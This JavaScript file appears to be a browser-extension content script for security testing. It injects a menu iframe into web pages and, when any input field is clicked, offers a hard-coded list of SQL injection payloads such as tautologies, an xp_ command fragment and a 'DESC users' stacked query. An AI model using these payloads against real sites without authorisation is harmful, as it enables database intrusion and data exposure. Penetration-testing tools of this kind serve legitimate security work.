//Create array of payloads to be added, these should be SQL payloads
const rawPayloadsDictionary = ["", "1 OR 1=1", "1\\' OR \\'1\\'=\\'1", "1\\'1", "1 EXEC XP_", "1 AND 1=1", "1\\' AND 1=(SELECT COUNT(*) FROM tablenames); --", "1 AND USER_NAME() = \\'dbo\\'", "\\\\\\'; DESC users; --"];

const ID_MENU = "menu_frame";

var lastInputPressed;

function main() {
    initializeMenuFrame();


    const inputs = document.getElementsByTagName("INPUT");
    for (let input of inputs) {
        if (input.tagName === "INPUT") {
            input.onclick = function () {
                lastInputPressed = this;

                let menu = document.getElementById(ID_MENU);

                if (isNotNull(menu) && !isVisible(menu)) show(menu);
            }
        }
    }
}

function initializeMenuFrame() {
    let menu = document.createElement("iframe");
    menu.id = ID_MENU;
    menu.src = browser.extension.getURL("menu/menu.html");
    hide(menu);

    if (null != document.getElementById(menu.id)) return;

    document.body.appendChild(menu);
}

function hide(HTMLElement) {
    HTMLElement.style.display = "none";
}

function show(HTMLElement) {
    HTMLElement.style.display = "block";
}

function isVisible(HTMLElement) {
    return HTMLElement.style.display !== "none";
}

function isNotNull(HTMLElement) {
    return null != HTMLElement;
}


//__________
main();
